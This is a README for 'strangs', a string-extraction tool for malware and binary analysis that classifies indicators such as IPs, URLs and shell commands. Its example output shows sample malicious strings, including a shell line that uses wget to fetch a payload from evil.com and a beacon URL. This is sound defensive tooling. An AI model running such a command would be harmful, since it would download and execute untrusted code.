# strangs

Language-aware string extraction for binary analysis. A smarter `strings(1)` replacement for security research.

## Why?

Traditional `strings` fails on modern binaries:

- **Go/Rust binaries** use `{ptr, len}` string representations, not null-terminated strings. Packed string data becomes unreadable garbage.
- **Windows PE files** use UTF-16LE, which `strings` misses entirely.
- **Malware** often appends data after the ELF/PE structure (overlay), hiding configs and C2 addresses.
- **XOR obfuscation** with single-byte keys hides IOCs from static analysis.
- **Mach-O code signatures** contain entitlements revealing malware capabilities.

`strangs` understands all of this and automatically classifies what it finds.

## Install

```
cargo install --path .
```

Optionally install [radare2](https://rada.re) or [rizin](https://rizin.re) for enhanced extraction.

## Usage

```
strangs malware.elf              # Full analysis with XOR detection
strangs -i malware.elf           # Filter out raw scan noise
strangs --no-xor malware.elf     # Disable XOR detection
strangs --json malware.elf       # JSON output for tooling
strangs --detect malware.elf     # Detect binary type (go/rust/unknown)
strangs -m 8 malware.elf         # Minimum 8 character strings
```

## Output

Strings are classified by type and colored by severity:

| Severity | Types |
|----------|-------|
| High (red) | `ip`, `ip:port`, `url`, `shell`, `sus`, `base64`, `overlay` |
| Medium (yellow) | `path`, `file`, `import`, `env`, `registry`, `error` |
| Low (green) | `func`, `export` |
| Info (dim) | `const`, `ident`, `section`, `key` |

Example output:
```
malware.elf · ELF x64 · 143520 bytes · 247 strings · 7f8e4b2a1c6d9f3e5b8a7c4d1e2f9a6b3c8d5e1f7a4b9c2d6e3f8a1b5c7d9e2f

    1a40 const        runtime.memequal
    1a60 path         /usr/lib/go
    1b00 base64       c2VjcmV0X2tleQ== [secret_key]
    1b80 url          https://api.evil.com/beacon
    1c00 ip:port      192.168.1.100:4444
    1d20 shell        /bin/sh -c wget http://evil.com/payload
    3701 entitlements
    <?xml version="1.0" encoding="UTF-8"?>
    <plist version="1.0">
    <dict>
    	<key>com.apple.security.get-task-allow</key>
    	<true/>
    </dict>
    </plist>

── Notable ──
    1b00 base64       c2VjcmV0X2tleQ== [secret_key]
    1b80 url          https://api.evil.com/beacon
    1c00 ip:port      192.168.1.100:4444
    1d20 shell        /bin/sh -c wget http://evil.com/payload
```

## Flags

```
-m, --min-length <N>      Minimum string length (default: 4)
-i, --interesting         Filter out raw scan noise
    --xor-min-length <N>  Minimum XOR-decoded string length (default: 10)
    --no-xor              Disable XOR detection
    --json                JSON output
    --simple              One string per line, no formatting
    --flat                Don't group by section
    --unfiltered          Include garbage/noise strings
    --detect              Show detected language and exit
    --r2                  Force radare2 usage
    --no-r2               Disable radare2
    --no-color            Plain text output
```

## Features

- **Go/Rust structure extraction**: Finds `{ptr, len}` pairs and extracts precise string boundaries
- **XOR string detection**: Brute-forces single-byte XOR keys to reveal obfuscated IOCs (enabled by default)
- **Mach-O entitlement extraction**: Parses LC_CODE_SIGNATURE to extract security entitlements and app IDs
- **IOC classification**: Automatically tags IPs, URLs, shell commands, suspicious paths, registry keys, base64
- **Overlay detection**: Extracts strings from data appended after ELF/PE/Mach-O boundaries
- **Wide strings**: UTF-16LE extraction for Windows binaries
- **Import/export extraction**: Shows which library symbols come from
- **Garbage filtering**: Filters misaligned reads and binary noise
- **radare2/rizin integration**: Uses r2/rz for enhanced analysis when available

## JSON Schema

```json
{
  "value": "https://evil.com",
  "data_offset": 1234,
  "section": ".rodata",
  "method": "Structure",
  "kind": "Url",
  "library": null
}
```

Methods: `Structure`, `RawScan`, `WideString`, `XorDecode`, `CodeSignature`, `R2String`, `R2Symbol`, `Heuristic`, `InstructionPattern`

## Library Usage

```rust
use strangs::{extract_strings, ExtractOptions};

let data = std::fs::read("binary")?;
let strings = strangs::extract_strings(&data, 4);

// With options
let opts = ExtractOptions::new(4)
    .with_r2("/path/to/binary")
    .with_xor(Some(10))  // XOR detection with min length 10
    .with_garbage_filter(true);
let strings = strangs::extract_strings_with_options(&data, &opts);
```

## License

Apache-2.0
